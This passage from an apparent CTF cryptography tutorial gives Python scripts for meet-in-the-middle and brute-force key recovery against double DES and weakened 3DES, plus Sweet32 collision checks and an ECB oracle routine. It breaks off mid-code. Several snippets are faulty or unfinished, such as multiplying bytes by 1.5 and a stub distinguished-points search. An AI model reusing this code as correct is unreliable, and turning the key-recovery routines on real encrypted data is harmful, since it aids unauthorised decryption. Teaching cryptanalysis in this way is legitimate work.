        des2 = DES.new(key2, DES.MODE_ECB)
        intermediate = des2.decrypt(ciphertext)
        
        if intermediate in forward_table:
            key1 = forward_table[intermediate]
            
            # Verify with multiple plaintext-ciphertext pairs
            print(f"[+] Potential match found!")
            print(f"    Key1: {key1.hex()}")
            print(f"    Key2: {key2.hex()}")
            
            return key1, key2
        
        if i % 1000 == 0:
            print(f"    Backward: {i}/{len(reduced_keyspace)}")
    
    return None, None

# Example with reduced keyspace (CTF scenario)
# Generate weak keys (e.g., low entropy)
def generate_weak_keys(count):
    """Generate predictable/weak keys for CTF"""
    keys = []
    for i in range(count):
        # Weak key: sequential or pattern-based
        key = (i).to_bytes(8, 'big')
        keys.append(key)
    return keys

# Usage (demonstration with small keyspace)
# weak_keys = generate_weak_keys(10000)  # 10k keys instead of 2^56
# pt = b"PLAINTEXT"  # Must be 8 bytes for DES
# ct = b"CIPHERTEXT"  # Known ciphertext
# k1, k2 = mitm_double_des_reduced(pt, ct, weak_keys)
```

**CTF-Optimized Implementation**:

```python
def mitm_ctf_attack(plaintext, ciphertext, encrypt_func, key_generator, keyspace_size):
    """
    Optimized MITM for CTF challenges
    
    Features:
    - Progress tracking
    - Memory-efficient with disk storage option
    - Multiple P-C pair verification
    """
    import hashlib
    import pickle
    import tempfile
    
    print(f"[*] MITM Attack - Keyspace: 2^{keyspace_size.bit_length()}")
    
    # Phase 1: Forward computation
    print("[*] Phase 1: Building forward table...")
    forward_file = tempfile.NamedTemporaryFile(delete=False)
    forward_table = {}
    
    keys_tested = 0
    for key1 in key_generator(keyspace_size):
        intermediate = encrypt_func(key1, plaintext)
        
        # Use hash as key to save memory
        inter_hash = hashlib.sha256(intermediate).digest()[:8]
        forward_table[inter_hash] = (key1, intermediate)
        
        keys_tested += 1
        if keys_tested % 100000 == 0:
            print(f"    Progress: {keys_tested:,} keys")
            
            # Optional: Flush to disk if memory constrained
            if keys_tested % 1000000 == 0:
                pickle.dump(forward_table, forward_file)
                print(f"    Checkpointed to disk")
    
    print(f"[*] Forward table: {len(forward_table):,} entries")
    
    # Phase 2: Backward search
    print("[*] Phase 2: Backward search...")
    keys_tested = 0
    
    for key2 in key_generator(keyspace_size):
        # Decrypt from ciphertext
        intermediate = encrypt_func(key2, ciphertext, decrypt=True)
        inter_hash = hashlib.sha256(intermediate).digest()[:8]
        
        if inter_hash in forward_table:
            key1, stored_inter = forward_table[inter_hash]
            
            # Verify match
            if stored_inter == intermediate:
                print(f"\n[+] MATCH FOUND!")
                print(f"    Key1: {key1}")
                print(f"    Key2: {key2}")
                
                # Cleanup
                forward_file.close()
                return key1, key2
        
        keys_tested += 1
        if keys_tested % 100000 == 0:
            print(f"    Progress: {keys_tested:,} keys")
    
    print("[-] No match found")
    forward_file.close()
    return None, None
```

**Memory-Efficient Variant (Distinguished Points)**:

```python
def mitm_distinguished_points(plaintext, ciphertext, encrypt_func, keyspace_size):
    """
    Memory-efficient MITM using distinguished points
    
    Only store points meeting certain criteria (e.g., last N bits = 0)
    Trade memory for additional computation
    
    [Inference] Reduces storage by factor of 2^N where N is bits checked
    """
    import hashlib
    
    def is_distinguished(value, bits=8):
        """Check if value is a distinguished point"""
        # Last 'bits' bits must be zero
        return int.from_bytes(hashlib.sha256(value).digest()[:1], 'big') & ((1 << bits) - 1) == 0
    
    # Only store distinguished points
    distinguished_table = {}
    
    print(f"[*] Using distinguished points (reduces storage by ~256x)")
    
    # Phase 1: Find distinguished points from encryption
    keys_tested = 0
    distinguished_found = 0
    
    for key1 in range(keyspace_size):
        current = plaintext
        steps = 0
        
        # Iterate until finding distinguished point
        while steps < 1000:  # Max chain length
            current = encrypt_func(key1 + steps, current)
            steps += 1
            
            if is_distinguished(current):
                distinguished_table[current] = (key1, steps)
                distinguished_found += 1
                break
        
        keys_tested += 1
        if keys_tested % 10000 == 0:
            print(f"    Keys: {keys_tested:,}, Distinguished: {distinguished_found:,}")
    
    print(f"[*] Found {distinguished_found:,} distinguished points")
    
    # Phase 2: Similar search from decryption side
    # [Implementation similar to Phase 1 but decrypting from ciphertext]
    
    return None, None  # Simplified for demonstration
```

**Parallel MITM Attack**:

```python
def parallel_mitm_attack(plaintext, ciphertext, encrypt_func, keyspace_size, num_workers=4):
    """
    Parallel MITM using multiprocessing
    """
    from multiprocessing import Process, Manager, Queue
    import queue
    
    def forward_worker(key_range, result_dict, progress_queue):
        """Worker for forward computation"""
        for key in key_range:
            intermediate = encrypt_func(key, plaintext)
            result_dict[intermediate] = key
            
            if key % 10000 == 0:
                progress_queue.put(('forward', key))
    
    def backward_worker(key_range, forward_dict, result_queue, progress_queue):
        """Worker for backward search"""
        for key in key_range:
            intermediate = encrypt_func(key, ciphertext, decrypt=True)
            
            if intermediate in forward_dict:
                result_queue.put((forward_dict[intermediate], key))
                return
            
            if key % 10000 == 0:
                progress_queue.put(('backward', key))
    
    # Setup shared memory
    manager = Manager()
    forward_dict = manager.dict()
    result_queue = Queue()
    progress_queue = Queue()
    
    # Split keyspace
    chunk_size = keyspace_size // num_workers
    
    # Phase 1: Parallel forward computation
    print(f"[*] Phase 1: {num_workers} workers computing forward...")
    processes = []
    
    for i in range(num_workers):
        start = i * chunk_size
        end = start + chunk_size if i < num_workers - 1 else keyspace_size
        
        p = Process(target=forward_worker, args=(range(start, end), forward_dict, progress_queue))
        p.start()
        processes.append(p)
    
    # Monitor progress
    for p in processes:
        p.join()
    
    print(f"[*] Forward table: {len(forward_dict):,} entries")
    
    # Phase 2: Parallel backward search
    print(f"[*] Phase 2: {num_workers} workers searching backward...")
    processes = []
    
    for i in range(num_workers):
        start = i * chunk_size
        end = start + chunk_size if i < num_workers - 1 else keyspace_size
        
        p = Process(target=backward_worker, 
                   args=(range(start, end), forward_dict, result_queue, progress_queue))
        p.start()
        processes.append(p)
    
    # Wait for result
    try:
        k1, k2 = result_queue.get(timeout=3600)  # 1 hour timeout
        print(f"[+] Keys found: Key1={k1}, Key2={k2}")
        
        # Terminate other workers
        for p in processes:
            p.terminate()
        
        return k1, k2
    except queue.Empty:
        print("[-] No match found within timeout")
        return None, None
```

**CTF Challenge Pattern Recognition**:

```python
def identify_mitm_scenario(challenge_data):
    """
    Identify if challenge is vulnerable to MITM
    """
    indicators = []
    
    # Check for double encryption
    if 'double' in challenge_data.lower() or 'twice' in challenge_data.lower():
        indicators.append("DOUBLE_ENCRYPTION mentioned")
    
    # Check for reduced keyspace hints
    if any(word in challenge_data.lower() for word in ['weak', 'reduced', 'small', 'limited']):
        indicators.append("REDUCED_KEYSPACE hinted")
    
    # Check for known plaintext
    if 'known plaintext' in challenge_data.lower() or 'plaintext' in challenge_data.lower():
        indicators.append("KNOWN_PLAINTEXT available")
    
    # Check keyspace size
    import re
    keysize_match = re.search(r'(\d+)-bit', challenge_data)
    if keysize_match:
        bits = int(keysize_match.group(1))
        if bits <= 40:
            indicators.append(f"FEASIBLE_KEYSPACE ({bits}-bit = 2^{bits})")
        elif bits <= 56:
            indicators.append(f"BORDERLINE_KEYSPACE ({bits}-bit, needs optimization)")
        else:
            indicators.append(f"LARGE_KEYSPACE ({bits}-bit, may not be practical)")
    
    if len(indicators) >= 2:
        return "LIKELY_MITM_VULNERABLE", indicators
    elif indicators:
        return "POSSIBLY_MITM_VULNERABLE", indicators
    else:
        return "MITM_UNLIKELY", []

# Usage
challenge = """
The encryption uses double DES with weak 32-bit keys.
You have one known plaintext-ciphertext pair.
"""

status, indicators = identify_mitm_scenario(challenge)
print(f"Status: {status}")
for ind in indicators:
    print(f"  - {ind}")
```

**Storage Requirements** [Inference]:

```
Algorithm     | Key Size | Storage for Forward Table | Feasibility
--------------|----------|---------------------------|-------------
2DES (full)   | 56-bit   | 2^56 * 8 bytes = 576 PB   | Impractical
2DES (weak)   | 40-bit   | 2^40 * 8 bytes = 8.8 TB   | Borderline
2DES (CTF)    | 32-bit   | 2^32 * 8 bytes = 34 GB    | Practical
Custom cipher | 24-bit   | 2^24 * 8 bytes = 134 MB   | Easy
Custom cipher | 20-bit   | 2^20 * 8 bytes = 8 MB     | Trivial
```

**Kali Linux Tools and Approaches**:

```bash
# No standard tool for MITM - typically custom scripts

# Python with PyCryptodome
pip3 install pycryptodome

# For reduced keyspace brute force (preprocessing)
# Generate key candidates
python3 << 'EOF'
import itertools

def generate_keyspace(keysize_bytes, charset=None):
    """Generate all keys of given size"""
    if charset is None:
        # Full binary keyspace
        for i in range(2**(keysize_bytes * 8)):
            yield i.to_bytes(keysize_bytes, 'big')
    else:
        # Charset-based (e.g., ASCII only)
        for combo in itertools.product(charset, repeat=keysize_bytes):
            yield bytes(combo)

# Example: 3-byte keys
keys = list(generate_keyspace(3))
print(f"Generated {len(keys):,} keys")
EOF

# Parallel processing with GNU Parallel
# (for embarrassingly parallel attacks)
seq 0 65535 | parallel -j 8 "python3 test_key.py {}"
```

### 3DES Vulnerability

Triple DES (3DES) applies DES three times with different keys to address DES's small key size. However, 3DES suffers from meet-in-the-middle vulnerabilities when keys are related, and specific keying options reduce effective security. The primary vulnerability occurs in 2-key 3DES (keying option 2) and certain attack scenarios.

**3DES Keying Options**:

```
Option 1 (3-key): K1 ≠ K2 ≠ K3  → Effective security: 168 bits (112 bits practical)
Option 2 (2-key): K1 ≠ K2, K3 = K1 → Effective security: 112 bits (theoretical), 80 bits (practical MITM)
Option 3 (1-key): K1 = K2 = K3 → Equivalent to single DES (backward compatibility)
```

**3DES Encryption Structure**:

```
Encryption: C = E_K3(D_K2(E_K1(P)))
Decryption: P = D_K1(E_K2(D_K3(C)))

Where E = DES encryption, D = DES decryption
```

**Meet-in-the-Middle on 2-Key 3DES**:

```python
def mitm_3des_2key_concept(plaintext, ciphertext):
    """
    MITM attack on 2-key 3DES (keying option 2)
    
    Given: C = E_K1(D_K2(E_K1(P)))
    Attack reduces complexity from 2^112 to 2^57
    
    [Inference] This is theoretical - requires 2^56 storage (impractical)
    But demonstrates why 2-key 3DES provides less security than expected
    """
    
    # Phase 1: Compute E_K1(P) for all K1
    # Store: intermediate1 = E_K1(P)
    # Storage: 2^56 entries
    
    # Phase 2: Compute D_K1(C) for all K1  
    # intermediate3 = D_K1(C)
    
    # Phase 3: For each K2, check if D_K2(intermediate1) == E_K2(intermediate3)
    
    # [Inference] Complexity:
    # Time: 2^56 + 2^56 + 2^56 = 3 * 2^56 ≈ 2^57.6
    # Space: 2^56
    
    print("[*] 2-key 3DES MITM attack")
    print("    Theoretical complexity: 2^57 operations")
    print("    Storage requirement: 2^56 * 8 bytes = 576 PB")
    print("    [!] Impractical but demonstrates weakness")
    
    pass  # Conceptual only

```

**Practical 3DES Weaknesses in CTF**:

```python
from Crypto.Cipher import DES3
import os

def test_3des_keying_options():
    """
    Demonstrate different 3DES keying options
    """
    plaintext = b"TESTDATA" * 2  # 16 bytes
    
    # Option 1: 3-key (24 bytes)
    key_3key = os.urandom(24)
    cipher = DES3.new(key_3key, DES3.MODE_ECB)
    ciphertext_3key = cipher.encrypt(plaintext)
    print(f"[*] 3-key 3DES: {ciphertext_3key.hex()}")
    
    # Option 2: 2-key (16 bytes, with K3=K1)
    key_2key = os.urandom(16)
    cipher = DES3.new(key_2key, DES3.MODE_ECB)
    ciphertext_2key = cipher.encrypt(plaintext)
    print(f"[*] 2-key 3DES: {ciphertext_2key.hex()}")
    
    # Option 3: 1-key (8 bytes, backward compatible with DES)
    # K1 = K2 = K3, equivalent to single DES
    key_1key = os.urandom(8)
    key_1key_triple = key_1key * 3  # Same key three times
    cipher = DES3.new(key_1key_triple[:24], DES3.MODE_ECB)
    ciphertext_1key = cipher.encrypt(plaintext)
    
    # Verify it's same as single DES
    des_cipher = DES3.new(key_1key * 2, DES3.MODE_ECB)  # PyCryptodome needs 16 bytes
    # [Note: For true single DES comparison, use DES module]
    
    print(f"[*] 1-key 3DES (DES compat): {ciphertext_1key.hex()}")

# Run demonstration
test_3des_keying_options()
```

**Identifying Weak 3DES Usage in CTF**:

```python
def analyze_3des_implementation(key_bytes):
    """
    Analyze 3DES key to identify keying option and weaknesses
    """
    key_len = len(key_bytes)
    
    if key_len == 24:
        # Check if 3-key or disguised 2-key/1-key
        k1 = key_bytes[0:8]
        k2 = key_bytes[8:16]
        k3 = key_bytes[16:24]
        
        if k1 == k2 == k3:
            return "WEAK: 1-key (DES equivalent)", 56
        elif k1 == k3:
            return "WEAK: 2-key disguised as 3-key", 112
        else:
            return "STRONG: 3-key 3DES", 168
    
    elif key_len == 16:
        # 2-key 3DES
        return "WEAK: 2-key 3DES (vulnerable to MITM)", 112
    
    elif key_len == 8:
        # Single DES
        return "VERY WEAK: Single DES", 56
    
    else:
        return f"UNKNOWN: {key_len}-byte key", 0

# Test with sample keys
test_keys = [
    b"A" * 24,  # Weak: same key repeated
    b"A" * 8 + b"B" * 8 + b"A" * 8,  # Weak: K1=K3
    b"A" * 8 + b"B" * 8 + b"C" * 8,  # Strong: all different
]

for key in test_keys:
    result, bits = analyze_3des_implementation(key)
    print(f"{result} ({bits} bits)")
```

**Known Plaintext Attack on Weak 3DES**:

```python
def known_plaintext_3des_weak(plaintext, ciphertext, key_hint=None):
    """
    Attack 3DES when additional weaknesses exist
    
    Scenarios:
    1. Very reduced keyspace (CTF artificial weakness)
    2. Related keys (K1 and K2 related)
    3. Known key bytes
    """
    from Crypto.Cipher import DES3
    import itertools
    
    if key_hint:
        # Brute force unknown bytes
        known_bytes = key_hint.get('known', b'')
        unknown_positions = key_hint.get('unknown_positions', [])
        
        print(f"[*] Known bytes: {len(known_bytes)}")
        print(f"[*] Unknown positions: {unknown_positions}")
        
        # Example: Last 4 bytes unknown
        attempts = 0
        for unknown_bytes in itertools.product(range(256), repeat=len(unknown_positions)):
            # Construct candidate key
            candidate_key = bytearray(known_bytes)
            for pos, byte_val in zip(unknown_positions, unknown_bytes):
                candidate_key[pos] = byte_val
            
            # Test
            try:
                cipher = DES3.new(bytes(candidate_key), DES3.MODE_ECB)
                test_ct = cipher.encrypt(plaintext)
                
                if test_ct == ciphertext:
                    print(f"[+] Key found after {attempts} attempts!")
                    print(f"    Key: {bytes(candidate_key).hex()}")
                    return bytes(candidate_key)
            except:
                pass
            
            attempts += 1
            if attempts % 100000 == 0:
                print(f"    Attempts: {attempts:,}")
        
        print(f"[-] Key not found after {attempts} attempts")
    
    return None

# Example CTF scenario: Last 32 bits unknown
# key_hint = {
#     'known': b'\x01\x23\x45\x67\x89\xab\xcd\xef' * 2 + b'\x00\x00\x00\x00',
#     'unknown_positions': [20, 21, 22, 23]  # Last 4 bytes
# }
# found_key = known_plaintext_3des_weak(pt, ct, key_hint)
```

**Related-Key Attack on 3DES**:

```python
def related_key_3des_attack(plaintexts, ciphertexts, key_relationship):
    """
    Attack when keys have known relationship
    
    Example: K2 = K1 ⊕ constant
    
    [Inference] Reduces effective keyspace significantly
    """
    from Crypto.Cipher import DES3
    
    if key_relationship == 'xor_constant':
        # K2 = K1 XOR C for some constant C
        # Only need to find K1 and C (instead of independent K1, K2)
        
        print("[*] Exploiting XOR relationship between K1 and K2")
        
        # Brute force constant (assume 32-bit for demonstration)
        for constant in range(2**32):
            for k1_candidate in range(2**24):  # Reduced K1 space
                k1 = k1_candidate.to_bytes(8, 'big')
                k2 = bytes([a ^ b for a, b in zip(k1, constant.to_bytes(8, 'big'))])
                
                # Construct 2-key 3DES key
                full_key = k1 + k2
                
                try:
                    cipher = DES3.new(full_key, DES3.MODE_ECB)
                    test_ct = cipher.encrypt(plaintexts[0])
                    
                    if test_ct == ciphertexts[0]:
                        # Verify with additional pairs
                        verified = all(
                            cipher.encrypt(pt) == ct
                            for pt, ct in zip(plaintexts[1:], ciphertexts[1:])
                        )
                        
                        if verified:
                            print(f"[+] Keys found!")
                            print(f"    K1: {k1.hex()}")
                            print(f"    K2: {k2.hex()}")
                            print(f"    Constant: {constant:08x}")
                            return k1, k2
                except:
                    pass
    
    return None, None
```

**Sweet32 Attack (Birthday Bound)**:

```python
def sweet32_vulnerability_check(block_count):
    """
    Check if 3DES usage is vulnerable to Sweet32
    
    Sweet32: Birthday attack on 64-bit block ciphers
    After ~2^32 blocks, collision probability becomes significant
    
    [Inference] 3DES has 64-bit blocks (same as DES)
    Vulnerable when encrypting large amounts of data
    """
    
    BLOCKS_THRESHOLD = 2**32  # ~32 GB of data
    block_size_bytes = 8  # DES/3DES block size
    
    data_encrypted_gb = (block_count * block_size_bytes) / (1024**3)
    
    if block_count > BLOCKS_THRESHOLD:
        print(f"[!] SWEET32 VULNERABLE")
        print(f"    Encrypted data: {data_encrypted_gb:.2f} GB")
        print(f"    Blocks: {block_count:,} (threshold: {BLOCKS_THRESHOLD:,})")
        print(f"    Collision probability: HIGH")
        print(f"    Recommendation: Migrate to AES")
        return True
    else:
        remaining = BLOCKS_THRESHOLD - block_count
        remaining_gb = (remaining * block_size_bytes) / (1024**3)
        print(f"[+] Below Sweet32 threshold")
        print(f"    Encrypted: {data_encrypted_gb:.2f} GB")
        print(f"    Safe margin: {remaining_gb:.2f} GB remaining")
        return False

# Example checks
sweet32_vulnerability_check(2**30)  # 8 GB - Safe
sweet32_vulnerability_check(2**33)  # 64 GB - Vulnerable
```

**Sweet32 Exploitation (Conceptual)**:

```python
def sweet32_attack_concept(ciphertext_blocks):
    """
    Sweet32 attack exploits birthday paradox in 64-bit blocks
    
    With ~2^32 blocks encrypted under same key:
    - Probability of collision approaches 50%
    - Collision reveals plaintext relationship
    
    Attack scenario:
    1. Collect large number of ciphertext blocks
    2. Find colliding blocks (same ciphertext)
    3. Infer plaintext relationship from collision
    
    [Inference] Requires ability to cause encryption of chosen data
    Common in HTTPS with long-lived sessions
    """
    
    print("[*] Sweet32 Birthday Attack on 3DES")
    print(f"    Blocks collected: {len(ciphertext_blocks):,}")
    
    # Find collisions
    seen_blocks = {}
    collisions = []
    
    for idx, block in enumerate(ciphertext_blocks):
        if block in seen_blocks:
            collisions.append((seen_blocks[block], idx))
            print(f"[!] Collision found: Block {seen_blocks[block]} == Block {idx}")
        else:
            seen_blocks[block] = idx
    
    if collisions:
        print(f"[+] Found {len(collisions)} collision(s)")
        print("    Can infer: P[i] XOR P[j] = 0 (same plaintext)")
        return collisions
    else:
        print("[-] No collisions found yet")
        # Calculate expected collisions
        n = len(ciphertext_blocks)
        expected = (n * (n - 1)) / (2 * 2**64)
        print(f"    Expected collisions: {expected:.6f}")
        print(f"    Need ~2^32 blocks for 50% collision probability")
        return []

# Simulate with random blocks (demonstration)
import os
# blocks = [os.urandom(8) for _ in range(2**20)]  # 1M blocks
# collisions = sweet32_attack_concept(blocks)
```

**CTF 3DES Attack Script Template**:

```python
#!/usr/bin/env python3
"""
3DES CTF Attack Template
Handles common CTF scenarios
"""

from Crypto.Cipher import DES3
import itertools
import os

class DES3_CTF_Attacker:
    def __init__(self, plaintext, ciphertext):
        self.plaintext = plaintext
        self.ciphertext = ciphertext
        
    def identify_weakness(self):
        """Identify potential attack vectors"""
        print("[*] Analyzing 3DES challenge...")
        
        # Check for hints in challenge description
        weaknesses = []
        
        # Check data size (Sweet32)
        if len(self.ciphertext) > 2**32 * 8:
            weaknesses.append("SWEET32: Large data volume")
        
        # Check for patterns
        if self.has_pattern():
            weaknesses.append("PATTERN: Repeating blocks detected")
        
        return weaknesses
    
    def has_pattern(self):
        """Check for repeating ciphertext blocks"""
        block_size = 8
        blocks = [self.ciphertext[i:i+block_size] 
                  for i in range(0, len(self.ciphertext), block_size)]
        
        return len(blocks) != len(set(blocks))
    
    def attack_weak_keyspace(self, keyspace_size=2**24):
        """Attack reduced keyspace (common in CTF)"""
        print(f"[*] Brute forcing {keyspace_size:,} key combinations...")
        
        attempts = 0
        
        for key_int in range(keyspace_size):
            # Generate candidate key
            # Try different patterns
            
            # Pattern 1: Sequential 8-byte chunks
            k1 = key_int.to_bytes(8, 'big')
            k2 = (key_int + 1).to_bytes(8, 'big')
            k3 = k1  # 2-key mode
            
            key = k1 + k2 + k3[:8]  # 24 bytes
            
            try:
                cipher = DES3.new(key[:24], DES3.MODE_ECB)
                test_ct = cipher.encrypt(self.plaintext)
                
                if test_ct == self.ciphertext:
                    print(f"[+] Key found! Attempts: {attempts:,}")
                    print(f"    Key: {key.hex()}")
                    return key
            except:
                pass
            
            attempts += 1
            if attempts % 100000 == 0:
                print(f"    Progress: {attempts:,} / {keyspace_size:,}")
        
        print(f"[-] Key not found in keyspace")
        return None
    
    def attack_partial_key(self, known_key_bytes, unknown_mask):
        """Attack when some key bytes are known"""
        print(f"[*] Attacking with partial key knowledge...")
        print(f"    Known: {known_key_bytes.hex()}")
        
        # Count unknown bytes
        unknown_count = bin(unknown_mask).count('1')
        print(f"    Unknown bytes: {unknown_count}")
        
        if unknown_count > 6:
            print(f"[!] Warning: {2**(unknown_count*8):,} combinations")
        
        attempts = 0
        
        # Iterate unknown byte combinations
        for combo in itertools.product(range(256), repeat=unknown_count):
            # Construct candidate key
            candidate = bytearray(known_key_bytes)
            
            # Fill in unknown positions
            unknown_idx = 0
            for i in range(24):
                if unknown_mask & (1 << i):
                    candidate[i] = combo[unknown_idx]
                    unknown_idx += 1
            
            try:
                cipher = DES3.new(bytes(candidate), DES3.MODE_ECB)
                test_ct = cipher.encrypt(self.plaintext)
                
                if test_ct == self.ciphertext:
                    print(f"[+] Key found! Attempts: {attempts:,}")
                    print(f"    Key: {bytes(candidate).hex()}")
                    return bytes(candidate)
            except:
                pass
            
            attempts += 1
            if attempts % 50000 == 0:
                print(f"    Attempts: {attempts:,}")
        
        return None
    
    def attack_ecb_oracle(self, oracle_encrypt):
        """Attack when we have encryption oracle"""
        print("[*] ECB Oracle Attack")
        
        # Technique: Byte-by-byte oracle attack
        # Similar to ECB mode attacks on block ciphers
        
        block_size = 8
        recovered = b''
        
        for target_byte_idx in range(len(self.plaintext)):
            print(f"[*] Recovering byte {target_byte_idx}...")
            
            # Craft prefix to align unknown byte
            prefix_len = (block_size - 1 - (target_byte_idx % block_size)) % block_size
            prefix = b'A' * prefix_len
            
            # Get target block
            target_ct = oracle_encrypt(prefix)
            target_block_idx = len(prefix + recovered) // block_size
            target_block = target_ct[target_block_idx*8:(target_block_idx+1)*8]
            
            # Brute force byte
            for byte_val in range(256):
                test_input = prefix + recovered + bytes([byte_val])
                test_ct = oracle_encrypt(test_input)
                test_block = test_ct[target_block_idx*8:(target_block_idx+1)*8]
                
                if test_block == target_block:
                    recovered += bytes([byte_val])
                    print(f"    Found: {chr(byte_val) if 32 <= byte_val < 127 else '?'}")
                    break
        
        return recovered

# Usage example
if __name__ == "__main__":
    # Example CTF scenario
    plaintext = b"TESTDATA" * 2  # 16 bytes
    
    # Simulate weak key (first 20 bytes known, last 4 unknown)
    actual_key = b"KNOWN_KEY_PART_HERE!" + b"\x12\x34\x56\x78"
    cipher = DES3.new(actual_key[:24], DES3.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    
    print(f"[*] Ciphertext: {ciphertext.hex()}")
    
    # Attack
    attacker = DES3_CTF_Attacker(plaintext, ciphertext)
    
    # Try partial key attack
    known = b"KNOWN_KEY_PART_HERE!" + b"\x00\x00\x00\x00"
    unknown_mask = 0b111100000000000000000000  # Last 4 bytes unknown
    
    # found_key = attacker.attack_partial_key(known, unknown_mask)
```

**Kali Linux Testing Environment**:

```bash
# Install required tools
apt update
apt install python3-pycryptodome

# Test 3DES implementation
python3 << 'EOF'
from Crypto.Cipher import DES3
import os

# Test different keying options
def test_3des_modes():
    plaintext = b"TESTDATA" * 2
    
    # 3-key mode
    key3 = DES3.adjust_key_parity(os.urandom(24))
    c3 = DES3.new(key3, DES3.MODE_ECB)
    ct3 = c3.encrypt(plaintext)
    
    # 2-key mode (K1, K2, K1)
    key2_base = DES3.adjust_key_parity(os.urandom(16))
    key2 = key2_base[:8] + key2_base[8:16] + key2_base[:8]
    c2 = DES3.new(key2, DES3.MODE_ECB)
    ct2 = c2.encrypt(plaintext)
    
    print("3-key CT:", ct3.hex())
    print("2-key CT:", ct2.hex())

test_3des_modes()
EOF

# Benchmark 3DES operations
python3 << 'EOF'
from Crypto.Cipher import DES3
import time

key = DES3.adjust_key_parity(b'YELLOW SUBMARINE' * 1.5)
cipher = DES3.new(key[:24], DES3.MODE_ECB)

data = b'A' * 1024 * 1024  # 1 MB

start = time.time()
for i in range(100):
    ct = cipher.encrypt(data)
elapsed = time.time() - start

print(f"3DES throughput: {100 / elapsed:.2f} MB/s")
print(f"Time per operation: {elapsed/100*1000:.2f} ms")
EOF
```

**Comparison: 2DES vs 3DES Security** [Inference]:

```
Cipher      | Key Bits | Naive Security | MITM Security | Practical Security
------------|----------|----------------|---------------|-------------------
DES         | 56       | 2^56           | N/A           | 2^56 (broken)
2DES        | 112      | 2^112          | 2^57          | 2^57 (weak)
3DES-2key   | 112      | 2^112          | 2^57          | 2^80 (deprecated)
3DES-3key   | 168      | 2^168          | 2^112         | 2^112 (legacy)
AES-128     | 128      | 2^128          | N/A           | 2^128 (secure)

Notes:
- 2DES provides almost no improvement over DES due to MITM
- 3DES-2key vulnerable to MITM, effective security ~80 bits
- 3DES-3key resists MITM but still vulnerable to Sweet32
- All 3DES modes deprecated in favor of AES (2023)
```

**CTF Red Flags for MITM/3DES Attacks**:

```python
def detect_mitm_3des_opportunity(challenge_text, available_data):
    """
    Identify CTF challenges vulnerable to MITM or 3DES attacks
    """
    indicators = {
        'mitm_likely': False,
        'three_des_weak': False,
        'attack_type': None,
        'confidence': 'low'
    }
    
    challenge_lower = challenge_text.lower()
    
    # Check for double/triple encryption mentions
    if any(word in challenge_lower for word in ['double', 'twice', '2des', '2-des']):
        indicators['mitm_likely'] = True
        indicators['attack_type'] = 'MITM_DOUBLE_ENCRYPTION'
        indicators['confidence'] = 'high'
    
    # Check for 3DES
    if any(word in challenge_lower for word in ['3des', 'triple des', 'triple-des', 'tdes']):
        indicators['three_des_weak'] = True
        
        # Check for 2-key mode hints
        if any(word in challenge_lower for word in ['2-key', 'two-key', '16-byte key']):
            indicators['attack_type'] = 'MITM_2KEY_3DES'
            indicators['confidence'] = 'high'
        
        # Check for Sweet32 scenario
        if 'large file' in challenge_lower or 'many blocks' in challenge_lower:
            indicators['attack_type'] = 'SWEET32_BIRTHDAY'
            indicators['confidence'] = 'medium'
    
    # Check for reduced keyspace
    if any(word in challenge_lower for word in ['weak key', 'small key', 'reduced', 'partial key']):
        indicators['attack_type'] = 'BRUTE_FORCE_REDUCED_KEYSPACE'
        indicators['confidence'] = 'high'
    
    # Check available data
    if available_data.get('known_plaintext') and available_data.get('ciphertext'):
        indicators['confidence'] = 'very_high'
    
    if available_data.get('encryption_oracle'):
        indicators['attack_type'] = 'ORACLE_ATTACK'
        indicators['confidence'] = 'high'
    
    return indicators

# Example usage
challenge = """
This challenge uses 2-key Triple-DES with a weak key generation scheme.
The first 20 bytes of the key are known, and you have one plaintext-ciphertext pair.
"""

available = {
    'known_plaintext': True,
    'ciphertext': True,
    'partial_key': True
}

result = detect_mitm_3des_opportunity(challenge, available)
print(f"Attack type: {result['attack_type']}")
print(f"Confidence: {result['confidence']}")
```

**Real-World 3DES Deprecation Timeline**:

```python
def check_3des_compliance(year):
    """
    Check 3DES compliance status for given year
    
    Timeline:
    - 2017: NIST deprecated 3DES for new applications
    - 2023: 3DES disallowed in TLS 1.2 and earlier
    - 2024: 3DES end-of-life in most protocols
    """
    
    deprecation_timeline = {
        2017: "DEPRECATED: NIST discourages new uses",
        2019: "WARNING: Industry moving away from 3DES",
        2023: "PROHIBITED: Removed from TLS standards",
        2024: "END_OF_LIFE: No longer acceptable"
    }
    
    for timeline_year, status in sorted(deprecation_timeline.items()):
        if year >= timeline_year:
            current_status = status
    
    return current_status

# CTF context: 3DES often appears in challenges to teach cryptographic weaknesses
print("[*] 3DES Status (2024):", check_3des_compliance(2024))
print("[*] CTF Usage: Educational demonstration of weak/deprecated crypto")
```

**Automated 3DES Attack Framework**:

```python
#!/usr/bin/env python3
"""
Automated 3DES/MITM Attack Framework for CTF
"""

from Crypto.Cipher import DES3, DES
import itertools
import time

class AutoMITM:
    """Automated MITM attack orchestrator"""
    
    def __init__(self, plaintext, ciphertext):
        self.pt = plaintext
        self.ct = ciphertext
        self.attack_results = []
    
    def run_all_attacks(self):
        """Try all applicable attack vectors"""
        
        print("[*] Starting automated attack suite...")
        
        # Attack 1: Detect cipher type
        cipher_type = self.detect_cipher()
        print(f"[*] Detected cipher: {cipher_type}")
        
        # Attack 2: Try common weak keys
        if self.try_common_keys():
            return
        
        # Attack 3: Reduced keyspace brute force
        if self.try_reduced_keyspace():
            return
        
        # Attack 4: Pattern-based key generation
        if self.try_pattern_keys():
            return
        
        print("[-] All automated attacks failed")
        print("[*] Manual analysis required")
    
    def detect_cipher(self):
        """Identify encryption algorithm"""
        ct_len = len(self.ct)
        pt_len = len(self.pt)
        
        if ct_len == pt_len:
            if ct_len % 8 == 0:
                return "Likely DES/3DES (8-byte blocks)"
            elif ct_len % 16 == 0:
                return "Likely AES (16-byte blocks)"
        
        return "Unknown (possibly stream cipher or padding)"
    
    def try_common_keys(self):
        """Try commonly used weak keys"""
        weak_keys = [
            b'YELLOW SUBMARINE' + b'\x00' * 8,
            b'\x00' * 24,
            b'\xff' * 24,
            b'A' * 24,
            b'password' * 3,
        ]
        
        print("[*] Trying common weak keys...")
        
        for key in weak_keys:
            try:
                cipher = DES3.new(key[:24], DES3.MODE_ECB)
                if cipher.encrypt(self.pt) == self.ct:
                    print(f"[+] FOUND: {key.hex()}")
                    return True
            except:
                pass
        
        return False
    
    def try_reduced_keyspace(self, max_keys=2**20):
        """Brute force reduced keyspace"""
        print(f"[*] Brute forcing {max_keys:,} keys...")
        
        for i in range(max_keys):
            # Try different key generation patterns
            k = i.to_bytes(8, 'big')
            
